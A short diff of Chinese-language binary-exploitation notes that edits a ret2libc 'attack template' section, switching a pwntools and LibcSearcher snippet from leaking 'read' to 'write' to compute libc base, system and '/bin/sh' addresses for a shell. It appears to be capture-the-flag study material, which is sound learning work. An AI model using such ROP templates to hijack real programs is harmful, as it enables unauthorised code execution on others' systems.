@@ -142,11 +142,11 @@ execve		59
 sigreturn	15
 ```
 
-#### 2.4 ret2libc
+#### 2.3 ret2libc
 
 **使用**：程序没有直接给system函数或者execve函数的地址，但是提供了puts、write等函数可以用于泄露函数的地址。构造ROP链来获取shell。
 
-攻击模板：
+**攻击模板**：
 
 ```python
 def ret2libc_i386_mannul():
@@ -224,8 +224,8 @@ def ret2libc_pwntools():
     io.send(payload)
     leak_addr = io.recv()
     # 利用libc来计算
-    libc = LibcSearcher('read', leak_addr)
-    libc_base_addr = leak_addr - libc.dump('read')
+    libc = LibcSearcher('write', leak_addr)
+    libc_base_addr = leak_addr - libc.dump('write')
     system_addr = libc_base_addr + libc.dump('system')
     str_bin_sh = libc_base_addr + libc.dump('str_bin_sh')
     # 这里调用system可以这样
